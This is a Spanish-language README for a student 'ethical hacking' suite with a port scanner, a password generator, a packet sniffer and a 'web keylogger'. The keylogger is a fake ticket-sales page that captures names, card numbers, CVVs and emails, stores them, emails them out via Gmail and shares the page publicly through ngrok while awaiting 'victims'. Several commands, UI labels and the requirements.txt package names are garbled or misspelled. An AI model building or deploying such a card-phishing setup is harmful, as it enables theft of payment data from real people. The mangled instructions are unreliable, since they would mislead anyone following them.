# 🛡️ Hacking Ético Suite - Herramientas de Seguridad Informática

![Python Version](https://img.shields.io/badge/python-3.12+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Ubuntu-lightgrey.svg)

Suite educativa de herramientas de hacking ético desarrolladas en Python que incluye:

- 🔍 **Escaneo de puertos** con Nmap
- 🔐 **Generador de contraseñas seguras**
- 📡 **Sniffer de red** con análisis gráfico
- ⌨️ **Keylogger web** con Node.js y Ngrok

> ⚠️ **ADVERTENCIA**: Esta herramienta es SOLO para fines educativos. Úsala únicamente en sistemas y redes que tengas autorización explícita para auditar.

---

## 📋 Tabla de Contenidos

- [Características](#-características)
- [Requisitos del Sistema](#-requisitos-del-sistema)
- [Instalación](#-instalación)
- [Configuración del Keylogger Web](#-configuración-del-keylogger-web)
- [Ejecución de la Suite](#-ejecución-de-la-suite)
- [Funcionalidades Detalladas](#-funcionalidades-detalladas)
- [Estructura del Proyecto](#-estructura-del-proyecto)
- [Ejemplos de Uso](#-ejemplos-de-uso)
- [Solución de Problemas](#-solución-de-problemas)
- [Licencia](#-licencia)

---

## ✨ Características

### 1. 🔍 Escaneo de Puertos (Valor: 20 pts)
- Escaneo TCP connect (`-sT`) sin necesidad de privilegios
- Validación de puertos entre 1 y 65535
- Soporte para puertos individuales, listas y rangos (ej: `22,80,443`, `1-1024`)
- Muestra solo puertos abiertos

### 2. 🔐 Generador de Contraseñas Seguras (Valor: 20 pts)
- Longitud mínima de 8 caracteres
- Combinación de letras, números y caracteres especiales
- Campo opcional para asociar un usuario
- Genera múltiples contraseñas simultáneamente
- Copia individual o copia todas al portapapeles

### 3. 📡 Sniffer de Red (Valor: 30 pts)
- Captura de tráfico en tiempo real usando `scapy`
- Guarda archivos `.pcap` (análisis técnico) y `.txt` (resumen legible)
- Genera gráficos automáticos:
  - **Gráfico de barras**: Paquetes por protocolo (TCP, UDP, ARP, etc.)
  - **Gráfico circular**: Distribución porcentual
  - **Gráfico de línea**: Evolución temporal (requiere numpy)
- Estadísticas: total de paquetes, duración, paquetes/segundo
- Demuestra la diferencia entre protocolos seguros (HTTPS) y no seguros (HTTP)

### 4. ⌨️ Keylogger Web (Valor: 30 pts)
- Servidor Node.js con Express
- Página web falsa de venta de boletos (simulación educativa)
- Captura todos los campos del formulario en tiempo real
- Toma capturas de pantalla automáticas
- Guarda logs en archivos locales (`logs_blessd.txt`, `datos_tarjetas.txt`)
- Envía datos por correo electrónico (Gmail)
- Integración con Ngrok para compartir remotamente

---

## 💻 Requisitos del Sistema

### Sistema Operativo
- **Ubuntu 22.04 / 24.04** (recomendado)
- Otras distribuciones Linux con soporte para `sudo`

### Software Requerido
```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Python y pip
sudo apt install python3 python3-pip python3-venv -y

# Instalar Nmap
sudo apt install nmap -y

# Instalar Node.js (versión 18 o superior)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install nodejs -y

# Instalar Ngrok (para compartir remotamente)
sudo snap install ngrok
# Autenticación (regístrate en https://ngrok.com para obtener un token)
ngrok config add-authtoken TU_TOKEN_AQUI

📦
1. Clonar el repositorio
Bash

git clone https://github.com/tuusuario/hacking-etico-suite.git
cd hacking-etico-suite

2. Crear y activar entorno virtual
Texto

python3 -m venv venv
source venv/bin/activate

3. Instalar dependencias de Python
Bash

pip install -r requirements.txt

Si no tienes requirements.txt, instala manualmente:
Bash

pip install python-nmap pyperclip scapy matplotlib pyngrok requests numpy

4. Instalar dependencias del keylogger
Bash

cd keylogger_boletos_blessd-main
npm install
cd ..

🔧 Configuración del Keylogger Web
Configurar correo electrónico (Gmail)

Edita el archivo keylogger_boletos_blessd-main/server.js y modifica:
javascript

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'tu_correo@gmail.com',
        pass: 'tu_contraseña_de_aplicacion'  // No es tu contraseña normal, es una "Contraseña de aplicación"
    }
});

    📌 Cómo obtener una contraseña de aplicación de Gmail:

        Ve a tu cuenta de Google → Seguridad → Verificación en 2 pasos (actívala)

        Luego ve a "Contraseñas de aplicación"

        Genera una para "Correo" y "Dispositivo Windows/Mac"

        Copia la contraseña de 16 dígitos

Configurar IP local (opcional)

Si estás en red local, cambia la línea en server.js:
javascript

const SERVER_IP = '192.168.1.X';  // Tu IP local

🚀 Ejecución de la Suite
Paso 1: Iniciar el servidor Node.js (Keylogger)
Bash

cd keylogger_boletos_blessd-main
node server.js

Verás:
Texto

=====================================================================
   SISTEMA BLESSD ENTRADAS
=====================================================================
📡 URL: http://192.168. X.X: 3000
📁 Logs: .../logs_blessd.txt
Esperando víctimas...

Certámica esta terminal.
Paso 2: Ejecutar la Suite de Python

En otra terminal :

# Activar entorno virtual
Fuente venv/bin/activate

# Ejecutar la suite
python hacking_suite_gui.py

Paso 3: Usar las herramientas
🔍 Escaneo de puertos

    Ingresa IP o dominio (ej: 192.168.1.1o scanme.nmap.org)

    Ingresa rango de puertos (ej: 22,80,443 o 1-1024)

    Haz clic en "Iniciareñaseñas"

🔐 Generador de contraseñas

    (Opcional) Ingresa un nombre de usuario

    Selecciona longitud (mínimo 8) y cantidad

    Haz clic en "Generar"

    Copia una contraseña o contraseñas todos

📡 Sniffer de red

    Interfaz: wlp2s0 (WiFi) o eth0 (Ethernet) o any

    Tiempo de captura: 30 segundos-60

    Nombre base: captura_ejemplo (genera .pcap y _detalle.txt)

    Haz clic en "Iniciar captura" (pedirá contraseña sudo)

    Durante la captura, genera tráfico (navega, haz ping, o pide a un compañero que acceda)

    Al finalizar, verás gráficos y la imagen guardada

⌨️ Keylogger Web

    Abrir localmente: Haz clic en "Abrir Keylogger Web"

    Compartir remotamente con compañero:

        Haz clic en "Iniciar ngrok"

        Espera a que aparezca la URL pública

        Copia la URL y compártela

        Los logs se actualizan automáticamente cada 3 segundos

🧩 Funcionalidades Detalladas
Escaneo de Puertos

    Usa la librería python-nmap

    Modo -sT (TCP connect) → No requiere sudo

    Soporta rangos: 80, 22,443, 1-1000, 1-65535

Generador de Contraseñas

    Longitud configurable (mínimo 8)

    Caracteres: A-Z a-z 0-9 !@#$%^&*()_+

    Cantidad: de 1 a 100

    Muestra las contraseñas en pantalla

    Copia individual o copia todas

Sniffer de Red

    ¡Captura usando scapy(requiere sudo)

    Guarda .pcap (para Wireshark) y .txt (resumen legible)

    Gráficos generados con matplotlib

    Opcional: evolución temporal con numpy

Keylogger Web

    Frontend: HTML/CSS/JS con TailwindCSS

    Backend: Node.js + Express

    Captura: nombre, tarjeta, expiración, CVV, email

    Capturas de pantalla con html2canvas

    Almacenamiento local en archivos de texto

    Envío de emails con nodemailer

    Exposición remota con ngrok

📁 Estructura del Proyecto

Hacking-etico-suite/
├── hacking_suite_gui.py # Aplicación principal Python
├── sniffer_aux.py # Script auxiliar para (generado en mayoraventa)
├── requirements.txt # Dependencias de Python
├── venv/ # Entorno virtual (no se sube a git)
│
├── keylogger_boletos_blessd-main/
│ ├── server.js # Servidor Node.js
│ ├── público/
│ │ └── index.html # Página web del keylogger
│ ├── logs_blessd.txt # Logss
│ ├── datos_tarjetas.txt # Datos de tarjetas de capturas
│ ├── capturas_blessd/ # Capturas de pantalla
│ ├── package.json
│ └── node_modules/ #s Node.js
│
├───.capsula # Archivo de captura ()
├───capsula_detalle.txt #Entre otros legibles ()
└──-capsula_capsulaico_completo.png Gráfico # géneros (genera)

🖼️ Ejemplos de Uso
Ejemplo 1: Escanear puertos abiertos

IP: 192.168.1.1
Rango: 22,80,443

Resultado:
✅ Puerto 22 (tcp) ABIERTO
✅ Puerto 80 (tcp) ABIERTO
✅ Puerto 443 (tcp) ABIERTO

Ejemplo 2: Generar contraseñas

Usuario: admin
Longitud: 16
Cantidad: 3

Resultado:
admin: G7h$9kL#2mN@8qR!
admin: pQ5&wE3*zX1#vB7$
admin: tY8^uI0%oP9&jK4*

3: Sniffer
Texto

Interfaz: wlp2s0
Tiempo: 30 segundos

Estadísticas:
✅ Total paquetes: 1847
✅ Duración: 30.00 s
✅ Paquetes/s: 61.6
✅ TCP: 73.5% | UDP: 12.3% | ARP: 8.8% | Otros: 5.4%

🐛 Solución de Problemas
Problema	Posible solución
ModuleNotFoundError: No module named 'nmap'	pip install python-nmap dentro del venv
Permission denied en sniffer	Usar sudo (el script lo pide automáticamente)
No se capturan paquetes	Genera tráfico: ping google.com o navega por internet
Error externally-managed-environment	Uso ambiente virtual: python3 -m venv venv && source venv/bin/activate
Ngrok no inicia	Ejecuta ngrok config check y asegura el authtoken
El gráfico de línea no aparece	Instala numpy: pip install numpy
El keylogger no envía correos	Usa contraseña de aplicación de Gmail, no la contraseña normal
El sniffer no encuentra la interfaz	Ejecuta ip a y usa el nombre correcto (ej. wlan0, eth0, any)
📚 Créditos y Agradecimientos

    Librerías utilizadas:

        python-nmap - Escaneo de puertos

        scapy - Captura y análisis de paquetes

        matplotlib - Generación de gráficos

        pyngrok - Integración con ngrok

        Express.js - Servidor web

    Inspiración: Proyecto educativo para la materia de Hacking Ético

⚖️ Licencia

Este proyecto está bajo la licencia MIT. Puedes usarlo, modificarlo y distribuirlo libremente para fines educativos.
👨‍💻 Autor

Jehiel Andru Medina Alvarez

    GitHub: @Jehiel19Andru

¡Gracias por usar Hacking Ético Suite! 🚀

---

## 📄 Archivo `requirements.txt`

Crea este archivo en la riba del proyecto:

```txt
matplotlib>=3.6.0
numpy>=1.23.0
nmap-python>=0.7.0
pyperclip>=1.8.0
pingrok>=7.0.0
Solicitudes>=2.31.0
scapy>=2.5.0
